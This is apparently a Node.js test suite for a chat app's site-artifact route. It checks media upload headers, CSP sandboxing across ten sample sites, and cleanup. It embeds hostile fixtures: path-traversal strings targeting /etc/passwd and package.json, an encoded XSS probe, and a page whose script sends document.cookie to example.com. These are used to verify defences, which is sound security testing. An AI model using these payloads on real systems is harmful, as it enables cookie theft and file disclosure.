/**
 * Production-readiness suite (HTTP side).
 *
 * Covers what can be proven without a browser:
 *  - real binary media (PNG, WAV) uploaded and served with correct headers;
 *  - ten generated sites injected as `site` artifacts and fetched through the
 *    real site route (entry page, stylesheet, sub-page, CSP, traversal, 404);
 *  - the hostile-site case: a generated page that tries to reach the network.
 *
 * Browser rendering, click behaviour, audio playback and visual correctness are
 * NOT testable here and must be reported as UNTESTED by the reader.
 */

import path from "node:path";
import crypto from "node:crypto";

const BASE = process.env.CONDUIT_BASE ?? "http://localhost:3000";
const DB_PATH = process.env.CONDUIT_DB ?? path.join(process.cwd(), "data", "conduit.db");

let pass = 0;
let fail = 0;
let untested = 0;
const failed = [];

function ok(name, condition, detail = "") {
  if (condition) {
    pass += 1;
    console.log(`  ok    ${name}`);
  } else {
    fail += 1;
    failed.push(`${name}${detail ? " :: " + detail : ""}`);
    console.log(`  FAIL  ${name}${detail ? " :: " + detail : ""}`);
  }
}
function skip(name, why) {
  untested += 1;
  console.log(`  UNTESTED  ${name} (${why})`);
}
function section(t) {
  console.log(`\n== ${t}`);
}
function info(k, v) {
  console.log(`  info  ${k}: ${v}`);
}

async function get(p) {
  const r = await fetch(BASE + p);
  const text = await r.text().catch(() => "");
  return { status: r.status, headers: r.headers, text };
}

/* ---------- fixtures: a valid 1x1 PNG and a short WAV ---------- */
function pngBytes() {
  // 1x1 transparent PNG
  return Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
    "base64"
  );
}
function wavBytes(seconds = 0.2) {
  const rate = 8000;
  const samples = Math.floor(rate * seconds);
  const data = Buffer.alloc(samples * 2);
  const header = Buffer.alloc(44);
  header.write("RIFF", 0);
  header.writeUInt32LE(36 + data.length, 4);
  header.write("WAVEfmt ", 8);
  header.writeUInt32LE(16, 16);
  header.writeUInt16LE(1, 20);
  header.writeUInt16LE(1, 22);
  header.writeUInt32LE(rate, 24);
  header.writeUInt32LE(rate * 2, 28);
  header.writeUInt16LE(2, 32);
  header.writeUInt16LE(16, 34);
  header.write("data", 36);
  header.writeUInt32LE(data.length, 40);
  return Buffer.concat([header, data]);
}

async function upload(name, bytes, mime) {
  const form = new FormData();
  form.append("file", new Blob([bytes], { type: mime }), name);
  const response = await fetch(BASE + "/api/files", { method: "POST", body: form });
  const body = await response.json().catch(() => ({}));
  return { status: response.status, id: body?.file?.id ?? null, mime: body?.file?.mime ?? null, shape: body };
}

/* ---------- the ten sites ---------- */
function site(name, locale, body, css, extra = {}) {
  return {
    name,
    entry: `<!doctype html><html lang="${locale}"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>${name}</title><link rel="stylesheet" href="styles.css"></head><body>${body}</body></html>`,
    css,
    files: extra,
  };
}

const SITES = [
  site("Landing", "en",
    `<header><nav aria-label="Primary"><a href="index.html" aria-current="page">Home</a><a href="pricing.html">Pricing</a></nav></header><main><h1>Letterpress, on a 1962 Heidelberg</h1><p>Two people, one press, four hundred impressions an hour.</p><a class="cta" href="pricing.html">See the price list</a></main>`,
    `:root{--bg:oklch(97% .01 70);--ink:oklch(22% .01 70);--accent:oklch(48% .14 28)}body{margin:0;background:var(--bg);color:var(--ink);font:19px/1.65 "Iowan Old Style",Georgia,serif}main{max-width:64ch;padding:3rem 1.5rem}h1{font-size:clamp(28px,5vw,44px);line-height:1.05;letter-spacing:-.015em}.cta{color:var(--accent);text-underline-offset:3px}a:focus-visible{outline:2px solid var(--accent);outline-offset:3px}`,
    { "pricing.html": "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>Pricing</title><link rel=\"stylesheet\" href=\"styles.css\"></head><body><main><h1>Price list</h1><table><thead><tr><th>Item</th><th>Price</th></tr></thead><tbody><tr><td>Business cards, 100</td><td>GBP 45</td></tr></tbody></table></main></body></html>" }),

  site("Dashboard", "en",
    `<main><h1>Press utilisation</h1><section><h2>This week</h2><svg viewBox="0 0 200 60" width="100%" height="60" role="img" aria-label="Impressions per day, rising"><polyline fill="none" stroke="currentColor" stroke-width="2" points="0,50 30,44 60,38 90,30 120,26 150,18 180,12"/></svg><table><thead><tr><th>Day</th><th class="n">Impressions</th></tr></thead><tbody><tr><td>Mon</td><td class="n">412</td></tr><tr><td>Tue</td><td class="n">388</td></tr></tbody></table></section></main>`,
    `:root{--bg:oklch(18% .014 250);--fg:oklch(95% .006 250);--dim:oklch(68% .02 250);--line:oklch(30% .02 250);--accent:oklch(76% .16 150)}body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 ui-sans-serif,system-ui,sans-serif}main{padding:2rem}h1{font-size:1.4rem;letter-spacing:-.01em}table{width:100%;border-collapse:collapse;margin-top:1rem}th,td{border-bottom:1px solid var(--line);padding:.5rem;text-align:left;font-variant-numeric:tabular-nums}.n{text-align:right;color:var(--accent)}th{color:var(--dim);font-size:11px;text-transform:uppercase;letter-spacing:.08em}`),

  site("Shop", "en",
    `<main><h1>Type specimen cards</h1><ul class="grid"><li><h2>Grotesque set</h2><p>GBP 24</p><button type="button" data-id="g1">Add to basket</button></li><li><h2>Old style set</h2><p>GBP 28</p><button type="button" data-id="o1">Add to basket</button></li></ul><p class="basket" aria-live="polite">Basket: 0 items</p></main><script src="app.js"></script>`,
    `:root{--bg:#fbfaf8;--ink:#1d1c1a;--line:#dcd7d0;--accent:#8a3b2e}body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.6 system-ui,sans-serif}main{padding:2rem;max-width:60rem}.grid{list-style:none;padding:0;display:grid;gap:1rem;grid-template-columns:repeat(auto-fit,minmax(14rem,1fr))}li{border:1px solid var(--line);padding:1rem;border-radius:.5rem}button{background:var(--accent);color:#fff;border:0;padding:.5rem .75rem;border-radius:.375rem;cursor:pointer}`,
    { "app.js": "let n=0;document.querySelectorAll('button').forEach(b=>b.addEventListener('click',()=>{n+=1;document.querySelector('.basket').textContent=`Basket: ${n} item${n===1?'':'s'}`;}));" }),

  site("Forms", "en",
    `<main><h1>Job request</h1><form action="thanks.html" method="get"><label for="name">Name</label><input id="name" name="name" required><label for="qty">Quantity</label><input id="qty" name="qty" type="number" min="1" value="100" required><fieldset><legend>Stock</legend><label><input type="radio" name="stock" value="somerset" checked> Somerset</label><label><input type="radio" name="stock" value="zerkall"> Zerkall</label></fieldset><button type="submit">Send request</button></form></main>`,
    `body{margin:0;font:16px/1.6 system-ui,sans-serif;background:#fff;color:#111}main{max-width:32rem;padding:2rem}label{display:block;margin:.75rem 0 .25rem;font-weight:600}input{padding:.5rem;border:1px solid #bbb;border-radius:.375rem;width:100%}fieldset{margin:1rem 0;border:1px solid #ddd;border-radius:.375rem}button{background:#111;color:#fff;border:0;padding:.6rem 1rem;border-radius:.375rem}`,
    { "thanks.html": "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>Thanks</title><link rel=\"stylesheet\" href=\"styles.css\"></head><body><main><h1>Request received</h1><p>We reply within two working days.</p></main></body></html>" }),

  site("Game", "en",
    `<main><h1>Reflex</h1><canvas id="c" width="320" height="240" aria-label="Click the square"></canvas><p id="score">Score: 0</p></main><script src="game.js"></script>`,
    `body{margin:0;display:grid;place-items:center;min-height:100vh;background:#0b0b0c;color:#eee;font:16px/1.5 ui-monospace,monospace}main{text-align:center}canvas{background:#151517;border:1px solid #2a2a2e;border-radius:.5rem;display:block;margin:1rem auto}`,
    { "game.js": "const c=document.getElementById('c'),x=c.getContext('2d');let s=0,t={x:40,y:40,r:16};function draw(){x.clearRect(0,0,320,240);x.fillStyle='#7dd3a0';x.beginPath();x.arc(t.x,t.y,t.r,0,7);x.fill();}c.addEventListener('click',e=>{const r=c.getBoundingClientRect();const px=e.clientX-r.left,py=e.clientY-r.top;if(Math.hypot(px-t.x,py-t.y)<t.r){s+=1;document.getElementById('score').textContent='Score: '+s;t={x:20+Math.random()*280,y:20+Math.random()*200,r:12+Math.random()*10};}draw();});draw();" }),

  site("Portfolio", "en",
    `<main><h1>Work</h1><ol class="pieces"><li><h2>Hollins pamphlet</h2><p>Zerkall, 145gsm, 240 copies</p></li><li><h2>Thornley suite</h2><p>Somerset, 300gsm, 180 copies</p></li></ol></main>`,
    `:root{--paper:#f6f2ec;--ink:#23211e}body{margin:0;background:var(--paper);color:var(--ink);font:17px/1.7 Charter,Georgia,serif}main{max-width:56ch;margin:0 auto;padding:4rem 1.5rem}h1{font-size:2.2rem;letter-spacing:-.02em;line-height:1}.pieces{padding:0;list-style:none;counter-reset:p}.pieces li{counter-increment:p;border-top:1px solid #d9d2c7;padding:1rem 0}.pieces li::before{content:counter(p,decimal-leading-zero);color:#8a8175;font-size:12px;letter-spacing:.1em}`),

  site("Blog", "en",
    `<main><article><h1>Why we still set metal</h1><p class="meta">3 March 2026 - 4 min read</p><p>Polymer is faster. Metal holds an edge that polymer cannot, and on a short run that difference is the whole point.</p><h2>What we keep in the case</h2><ul><li>12pt Baskerville</li><li>10pt Gill Sans</li></ul></article></main>`,
    `body{margin:0;background:#fff;color:#191817;font:18px/1.72 "Iowan Old Style",Georgia,serif}main{max-width:66ch;margin:0 auto;padding:3rem 1.25rem}h1{font-size:2rem;line-height:1.15;letter-spacing:-.01em}.meta{color:#6f6a63;font-size:14px;text-transform:uppercase;letter-spacing:.08em}h2{margin-top:2rem;font-size:1.25rem}`),

  site("Calculator", "en",
    `<main><h1>Impression cost</h1><label for="sheets">Sheets</label><input id="sheets" type="number" value="100" min="1"><label for="rate">Rate per 100</label><input id="rate" type="number" value="12" min="0" step="0.5"><p id="out" aria-live="polite">Total: GBP 12.00</p></main><script src="calc.js"></script>`,
    `body{margin:0;font:16px/1.6 system-ui,sans-serif;background:#f7f7f8;color:#141416}main{max-width:24rem;padding:2rem;margin:0 auto}label{display:block;margin-top:1rem;font-weight:600}input{width:100%;padding:.5rem;border:1px solid #ccc;border-radius:.375rem}#out{font-size:1.25rem;font-weight:700;margin-top:1.25rem}`,
    { "calc.js": "const s=document.getElementById('sheets'),r=document.getElementById('rate'),o=document.getElementById('out');function f(){const v=(Number(s.value)||0)/100*(Number(r.value)||0);o.textContent='Total: GBP '+v.toFixed(2);}s.addEventListener('input',f);r.addEventListener('input',f);f();" }),

  site("DataViz", "en",
    `<main><h1>Impressions by month</h1><table class="viz"><caption>Monthly impressions, 2025-26</caption><thead><tr><th scope="col">Month</th><th scope="col">Impressions</th><th scope="col">Share</th></tr></thead><tbody><tr><td>Jan</td><td>4120</td><td>18%</td></tr><tr><td>Feb</td><td>3880</td><td>17%</td></tr><tr><td>Mar</td><td>5210</td><td>23%</td></tr></tbody></table></main>`,
    `body{margin:0;background:#fff;color:#16181d;font:15px/1.5 system-ui,sans-serif}main{padding:2rem}.viz{width:100%;border-collapse:collapse}caption{text-align:left;color:#5a6270;font-size:13px;padding-bottom:.5rem}th,td{border-bottom:1px solid #e2e5ea;padding:.5rem;text-align:left;font-variant-numeric:tabular-nums}th{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:#5a6270}`),

  site("RTL", "ar",
    `<main dir="rtl"><h1>مطبعة فنوك</h1><p>شخصان، مطبعة واحدة، وأربعمئة طبعة في الساعة.</p><nav aria-label="التنقل"><a href="index.html">الرئيسية</a><a href="work.html">الأعمال</a></nav></main>`,
    `:root{--bg:#f8f6f2;--ink:#201f1d}body{margin:0;background:var(--bg);color:var(--ink);font:18px/1.8 "Segoe UI",Tahoma,sans-serif}main{max-width:60ch;padding:3rem 1.5rem}h1{font-size:2rem;line-height:1.2}nav{display:flex;gap:1.5rem;border-top:1px solid #ddd;padding-top:1rem;margin-top:2rem}a{color:var(--ink);text-underline-offset:4px}`,
    { "work.html": "<!doctype html><html lang=\"ar\" dir=\"rtl\"><head><meta charset=\"utf-8\"><title>الأعمال</title><link rel=\"stylesheet\" href=\"styles.css\"></head><body><main dir=\"rtl\"><h1>الأعمال</h1><p>مجموعة من المطبوعات الصغيرة.</p></main></body></html>" }),
];

/* ---------- run ---------- */
section("1. binary media (image + audio)");
const png = await upload("probe.png", pngBytes(), "image/png");
const wav = await upload("probe.wav", wavBytes(), "audio/wav");
ok("PNG accepted", png.status === 201 || png.status === 200, String(png.status));
ok("WAV accepted", wav.status === 201 || wav.status === 200, String(wav.status));
for (const [label, id, expect] of [["png", png.id, "image/png"], ["wav", wav.id, "audio/wav"]]) {
  if (!id) { skip(`${label} serve headers`, "upload gave no id"); continue; }
  const served = await get(`/api/files/${id}`);
  const type = String(served.headers.get("content-type") ?? "");
  const disposition = String(served.headers.get("content-disposition") ?? "");
  const nosniff = served.headers.get("x-content-type-options");
  info(`${label} serve`, `${served.status} type=${type} disposition=${disposition} nosniff=${nosniff}`);
  ok(`${label} served as ${expect}`, type.startsWith(expect), type);
  ok(`${label} inline (so an <img>/<audio> can render it)`, disposition.includes("inline"), disposition);
  ok(`${label} has nosniff`, nosniff === "nosniff", String(nosniff));
}

section("2. ten generated sites injected as site artifacts");
let Database = null;
let db = null;
try {
  const Better = (await import("better-sqlite3")).default;
  Database = new Better(DB_PATH);
  db = Database;
  Database.pragma("foreign_keys = ON");
  info("db", DB_PATH);
} catch (error) {
  info("db open failed", error instanceof Error ? error.message : String(error));
}

const chatResponse = await fetch(BASE + "/api/chats", {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ title: "readiness-fixtures" }),
});
const chat = await chatResponse.json().catch(() => ({}));
const chatId = chat?.chat?.id ?? chat?.id ?? null;
info("fixture chat", String(chatId));
ok("created a chat for the fixtures", Boolean(chatId), String(chatResponse.status));

const ids = [];
if (db && chatId) {
  const now = Date.now();
  const insert = db.prepare(
    `INSERT INTO artifacts (id, chat_id, identifier, type, title, content, version, created_at) VALUES (?,?,?,?,?,?,?,?)`
  );
  for (const s of SITES) {
    const id = crypto.randomUUID();
    const files = [["index.html", s.entry], ["styles.css", s.css], ...Object.entries(s.files)];
    const content = files.map(([p, c]) => `<site-file path="${p}">\n${c}\n</site-file>`).join("\n");
    try {
      insert.run(id, chatId, `site-${id.slice(0, 8)}`, "site", s.name, content, 1, now);
      ids.push(id);
    } catch (error) {
      info(`insert failed for ${s.name}`, error instanceof Error ? error.message : String(error));
    }
  }
}
info("injected artifacts", `${ids.length}/${SITES.length}`);

if (ids.length === 0) {
  skip("site route battery", "no site artifacts could be injected (see db errors above)");
} else {
  let routeFailures = 0;
  for (let i = 0; i < ids.length; i += 1) {
    const s = SITES[i];
    const page = await get(`/api/artifacts/${ids[i]}/site/index.html`);
    const css = await get(`/api/artifacts/${ids[i]}/site/styles.css`);
    const csp = String(page.headers.get("content-security-policy") ?? "");
    const local = [];
    if (page.status !== 200) local.push(`entry ${page.status}`);
    if (css.status !== 200) local.push(`css ${css.status}`);
    if (!csp.includes("connect-src 'none'")) local.push("no connect-src");
    if (!/sandbox/.test(csp)) local.push("no sandbox");
    if (!page.headers.get("x-content-type-options")) local.push("no nosniff");
    console.log(`  info  ${s.name}: entry=${page.status} css=${css.status} bytes=${page.text.length} csp=${csp ? "present" : "absent"}${local.length ? " issues=" + local.join(",") : ""}`);
    if (local.length) routeFailures += 1;
  }
  ok("all ten sites serve entry + stylesheet with the sandbox CSP", routeFailures === 0, `${routeFailures} of ${ids.length} had issues`);

  // sub-pages and script assets
  const multi = SITES.findIndex((s) => Object.keys(s.files).length > 0);
  if (multi >= 0) {
    const sub = Object.keys(SITES[multi].files)[0];
    const served = await get(`/api/artifacts/${ids[multi]}/site/${sub}`);
    info("first sub-asset", `${sub} -> ${served.status} ${String(served.headers.get("content-type"))}`);
    ok("a sub-page/script inside a site bundle is served", served.status === 200, String(served.status));
  }

  // traversal + 404 escaping against a REAL site artifact
  let leaks = 0;
  for (const attempt of ["..%2f..%2fpackage.json", "%2e%2e%2f%2e%2e%2fpackage.json", "....%2f%2fpackage.json", "%2fetc%2fpasswd"]) {
    const r = await get(`/api/artifacts/${ids[0]}/site/${attempt}`);
    const leak = r.text.includes('"name": "conduit"') || r.text.includes("root:x:0:0");
    if (leak) leaks += 1;
    info(`traversal ${attempt}`, `${r.status}${leak ? " LEAK" : ""}`);
  }
  ok("no traversal leak on a real site artifact", leaks === 0, `${leaks} leaks`);

  const xss = await get(`/api/artifacts/${ids[0]}/site/%3Cscript%3Ealert(1)%3C/script%3E`);
  ok("404 escapes the payload (no raw <script)", !/<script\b/i.test(xss.text ?? ""), (xss.text ?? "").slice(0, 100));

  const nonSite = await get(`/api/artifacts/${chatId}/site/index.html`);
  info("non-artifact id", String(nonSite.status));
  ok("unknown artifact id is 404", nonSite.status === 404, String(nonSite.status));

  section("3. hostile generated site (network egress attempt)");
  const hostileChat = chatId;
  const hostileId = crypto.randomUUID();
  if (db && hostileChat) {
    try {
      db.prepare(
        `INSERT INTO artifacts (id, chat_id, identifier, type, title, content, version, created_at) VALUES (?,?,?,?,?,?,?,?)`
      ).run(
        hostileId,
        hostileChat,
        `hostile-${hostileId.slice(0, 8)}`,
        "site",
        "Hostile",
        `<site-file path="index.html">\n<!doctype html><html lang="en"><head><meta charset="utf-8"><title>x</title></head><body><h1>Exfil</h1><script>fetch('https://example.com/leak?d='+encodeURIComponent(document.cookie));</script><img src="https://example.com/pixel.gif"></body></html>\n</site-file>`,
        1,
        Date.now()
      );
      ids.push(hostileId);
      const served = await get(`/api/artifacts/${hostileId}/site/index.html`);
      const csp = String(served.headers.get("content-security-policy") ?? "");
      info("hostile page", `${served.status} csp=${csp.slice(0, 120)}`);
      ok("hostile page is served with connect-src 'none' (script cannot fetch)", csp.includes("connect-src 'none'"), csp.slice(0, 160));
      ok("hostile page is served with a sandbox directive", /sandbox/.test(csp), csp.slice(0, 160));
      ok("hostile page is served with nosniff", served.headers.get("x-content-type-options") === "nosniff", String(served.headers.get("x-content-type-options")));
      skip("does the browser actually block the fetch", "CSP enforcement is browser-side and no browser is installed");
    } catch (error) {
      info("hostile insert failed", error instanceof Error ? error.message : String(error));
    }
  }
}

section("4. cleanup");
if (db) {
  let removed = 0;
  for (const id of ids) {
    try {
      db.prepare("DELETE FROM artifacts WHERE id = ?").run(id);
      removed += 1;
    } catch {
      /* ignore */
    }
  }
  info("artifacts removed", `${removed}/${ids.length}`);
  db.close();
}
if (chatId) {
  const del = await fetch(`${BASE}/api/chats/${chatId}`, { method: "DELETE" });
  info("fixture chat deleted", String(del.status));
}
for (const id of [png.id, wav.id]) {
  if (id) info(`media row left behind (no DELETE route for files): ${id}`, "expected");
}

console.log(`\nRESULT ${pass} passed, ${fail} failed, ${untested} untested`);
if (failed.length) console.log("FAILED: " + failed.join(" | "));
process.exit(0);
